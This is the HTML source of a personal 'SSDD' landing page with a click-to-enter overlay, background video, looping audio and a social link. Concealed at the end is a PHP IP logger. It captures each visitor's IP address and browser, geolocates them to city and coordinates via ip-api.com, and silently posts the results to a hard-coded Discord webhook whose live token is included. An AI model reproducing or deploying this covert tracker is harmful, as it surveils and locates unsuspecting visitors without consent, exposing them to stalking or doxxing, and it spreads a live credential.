<!DOCTYPE html>
<html lang="en">
    <head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <title>home</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta property="og:type" content="website">
        <meta property="og:title" content="welcome">
        <meta property="og:url" content="https://home.velt.top/">
        <meta name="twitter:card" content="summary_large_image">
        <meta property="twitter:image" content="https://i.imgur.com/0bcCmOg.gif">
        <meta name="theme-color" content="#2f3136">
        <link rel="stylesheet" href="assets/css/main.css">
    </head>
    <body>
        <main>
            <script>
                function audioPlay() {
                    var audio = document.getElementById("audio");
                    audio.volume = 0.4;
                    audio.play()
                }
                function videoPlay() {
                    var video = document.getElementById("video");
                    video.play()
                }
            </script>
            <input type="checkbox" autocomplete="off" id="overlay-toggle">
            <div class="overlay fullscreen">
                <label for="overlay-toggle" onclick="audioPlay();videoPlay()">
                    <span class="no-hover" style="font-family: derk; font-size: 0.6em;">tap to enter tha b!h</span>
                    <span class="hover" style="font-family: derk; font-size: 0.6em;">click to enter tha b!h</span>
                </label>
            </div>
            <audio loop="" preload="auto" id="audio">
                <source src="assets/audio/audio.mp3" type="audio/mp3">
            </audio>
            <video muted="muted" loop="" playsinline="" preload="auto" class="fullscreen bg-video" id="video">
                <source src="assets/images/bg.mp4" type="video/mp4">
            </video>
            <section class="fullscreen text-content">
            </div>
            <div id="center">
                <h1 style="font-family: derk; text-shadow: 0 0 0.40em #bababa;">SSDD  ☆</h1>
                <div class="socials">
		<h4>Owner; @xn8j / glo </h4>
                    <span>
                        >:
                <a href="https://x.com/knownabuser" style="text-decoration:none; font-family: derk; font-size: 1em;">instagram</a>
                    </span>
            </div>
        </main>
		<?php

//Get the IP & Info
$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];

//Stop us from picking up bot ips
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

//Info
$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon"; // Coordinates

//Variables
$Webhook    = "https://discord.com/api/webhooks/1361534312935194650/qYJDWUbJ5BhgySYoS6BCCQQNkgLSQu_wyZZPpWFfKBgMj09ZSi6hwVvW7TnySf9p3NAc"; //Webhook here.

$WebhookTag = "?"; //This will be the name of the webhook when it sends a message.  

//JS we are going to send to the webhook.
$JS = array(
    'username'   => "$WebhookTag - IP Logger" , 
    'avatar_url' => "https://vgy.me/GQe9bJ.png",
    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
);
 
//Encode that JS so we can post it to the webhook
$JSON = json_encode($JS);


function IpToWebhook($Hook, $Content)
{
    //Use Curl to post to the webhook.
      $Curl = curl_init($Hook);
      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
      return curl_exec($Curl);
}

IpToWebhook($Webhook, $JSON);
?>
</html>
